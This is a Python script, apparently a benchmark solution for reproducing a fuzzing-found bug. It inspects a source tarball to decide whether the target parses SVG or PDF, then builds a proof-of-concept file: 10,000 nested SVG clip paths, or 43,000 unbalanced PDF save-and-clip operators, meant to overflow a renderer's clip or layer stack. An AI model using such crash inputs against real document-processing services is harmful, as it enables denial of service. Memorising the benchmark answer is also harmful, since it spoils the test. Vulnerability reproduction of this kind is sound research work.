import os
import tarfile
import tempfile
from io import StringIO, BytesIO


class Solution:
    def solve(self, src_path: str) -> bytes:
        root_dir = self._extract_tarball(src_path)
        input_type = self._detect_input_type(root_dir)
        if input_type == "svg":
            return self._generate_svg_poc()
        # Default to PDF-style PoC if unsure
        return self._generate_pdf_poc()

    def _extract_tarball(self, src_path: str) -> str:
        tmp_dir = tempfile.mkdtemp(prefix="poc_gen_")
        try:
            with tarfile.open(src_path, "r:*") as tf:
                self._safe_extract(tf, tmp_dir)
        except tarfile.ReadError:
            # If it's not a tarball for some reason, still return tmp_dir
            pass
        return tmp_dir

    def _safe_extract(self, tar_obj: tarfile.TarFile, path: str) -> None:
        base_path = os.path.abspath(path)
        for member in tar_obj.getmembers():
            member_path = os.path.join(path, member.name)
            abs_member_path = os.path.abspath(member_path)
            if not abs_member_path.startswith(base_path + os.sep) and abs_member_path != base_path:
                continue
            try:
                tar_obj.extract(member, path)
            except Exception:
                continue

    def _detect_input_type(self, root_dir: str) -> str:
        # 1. Try project.yaml
        proj_type = self._detect_from_project_yaml(root_dir)
        if proj_type:
            return proj_type

        # 2. Try fuzz targets
        fuzz_type = self._detect_from_fuzz_files(root_dir)
        if fuzz_type:
            return fuzz_type

        # 3. Fallback: search whole repo for hints
        wide_type = self._detect_from_repo_wide_scan(root_dir)
        if wide_type:
            return wide_type

        # 4. Final fallback: None
        return "pdf"

    def _detect_from_project_yaml(self, root_dir: str) -> str | None:
        for dirpath, _, filenames in os.walk(root_dir):
            for name in filenames:
                if name == "project.yaml":
                    path = os.path.join(dirpath, name)
                    try:
                        with open(path, "r", errors="ignore") as f:
                            text = f.read().lower()
                    except Exception:
                        continue
                    if "svg" in text or "librsvg" in text:
                        return "svg"
                    if "pdf" in text or "pdfium" in text or "poppler" in text or "qpdf" in text or "mupdf" in text:
                        return "pdf"
        return None

    def _detect_from_fuzz_files(self, root_dir: str) -> str | None:
        type_found = None
        type_with_clip = None
        exts = (".c", ".cc", ".cpp", ".cxx", ".C", ".CPP", ".c++", ".C++")
        for dirpath, _, filenames in os.walk(root_dir):
            for name in filenames:
                if not name.endswith(exts):
                    continue
                path = os.path.join(dirpath, name)
                try:
                    with open(path, "r", errors="ignore") as f:
                        data = f.read()
                except Exception:
                    continue
                if "LLVMFuzzerTestOneInput" not in data:
                    continue
                lower = data.lower()
                t = None
                if "svg" in lower or "sksvg" in lower or "librsvg" in lower or "<svg" in lower:
                    t = "svg"
                elif (
                    "pdf" in lower
                    or "fpdf_" in data
                    or "pdfium" in lower
                    or "poppler" in lower
                    or "qpdf" in lower
                    or "mupdf" in lower
                ):
                    t = "pdf"

                if t:
                    if type_found is None:
                        type_found = t
                    if "clip" in lower or "layer" in lower:
                        type_with_clip = t

        if type_with_clip:
            return type_with_clip
        return type_found

    def _detect_from_repo_wide_scan(self, root_dir: str) -> str | None:
        text_exts = (".c", ".cc", ".cpp", ".cxx", ".C", ".CPP", ".h", ".hpp", ".hh", ".txt", ".md", ".rst")
        found_svg = False
        found_pdf = False
        for dirpath, _, filenames in os.walk(root_dir):
            for name in filenames:
                if not name.endswith(text_exts):
                    continue
                path = os.path.join(dirpath, name)
                try:
                    with open(path, "r", errors="ignore") as f:
                        data = f.read(200000)  # limit to avoid huge reads
                except Exception:
                    continue
                lower = data.lower()
                if "svg" in lower or "librsvg" in lower:
                    found_svg = True
                if "pdf" in lower or "pdfium" in lower or "poppler" in lower or "qpdf" in lower or "mupdf" in lower:
                    found_pdf = True
            # prefer early exit if obvious
            if found_svg and not found_pdf:
                return "svg"
            if found_pdf and not found_svg:
                return "pdf"
        if found_svg:
            return "svg"
        if found_pdf:
            return "pdf"
        return None

    def _generate_svg_poc(self) -> bytes:
        # Deeply nested clip paths to overflow clip/layer stack
        N = 10000  # number of nesting levels
        sio = StringIO()
        sio.write('<?xml version="1.0"?>\n')
        sio.write('<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">\n')
        sio.write('<defs>\n')
        for i in range(N):
            sio.write(
                f'<clipPath id="c{i}"><rect x="0" y="0" width="100" height="100"/></clipPath>\n'
            )
        sio.write('</defs>\n')
        for i in range(N):
            sio.write(f'<g clip-path="url(#c{i})">\n')
        sio.write('<rect x="0" y="0" width="100" height="100" fill="black"/>\n')
        for _ in range(N):
            sio.write('</g>\n')
        sio.write('</svg>\n')
        return sio.getvalue().encode("utf-8")

    def _generate_pdf_poc(self) -> bytes:
        # Deep nesting of graphics state with clipping to overflow layer/clip stack
        buf = BytesIO()

        def w(b: bytes) -> None:
            buf.write(b)

        # PDF header
        w(b"%PDF-1.4\n%\xff\xff\xff\xff\n")

        offsets: list[int] = []

        def add_obj(obj_bytes: bytes) -> None:
            offsets.append(buf.tell())
            w(obj_bytes)

        # 1: Catalog
        add_obj(b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n")
        # 2: Pages
        add_obj(b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n")
        # 3: Page
        add_obj(
            b"3 0 obj\n"
            b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R >>\n"
            b"endobj\n"
        )

        # 4: Contents stream with many nested clips
        clip_stream = self._generate_pdf_clip_stream()
        clip_bytes = clip_stream.encode("ascii")
        obj4 = (
            b"4 0 obj\n<< /Length "
            + str(len(clip_bytes)).encode("ascii")
            + b" >>\nstream\n"
            + clip_bytes
            + b"\nendstream\nendobj\n"
        )
        add_obj(obj4)

        # xref table
        startxref = buf.tell()
        w(b"xref\n")
        w(b"0 5\n")
        w(b"0000000000 65535 f \n")
        for off in offsets:
            w(f"{off:010d} 00000 n \n".encode("ascii"))

        # trailer
        w(b"trailer\n<< /Size 5 /Root 1 0 R >>\n")
        w(b"startxref\n")
        w(str(startxref).encode("ascii") + b"\n")
        w(b"%%EOF\n")

        return buf.getvalue()

    def _generate_pdf_clip_stream(self) -> str:
        # Each line pushes graphics state and sets a clipping path
        # Large N to exceed any reasonable nesting bound
        N = 43000
        lines = []
        line = "q 0 0 100 100 re W n\n"
        for _ in range(N):
            lines.append(line)
        # Single restore at the end (unbalanced on purpose)
        lines.append("Q\n")
        return "".join(lines)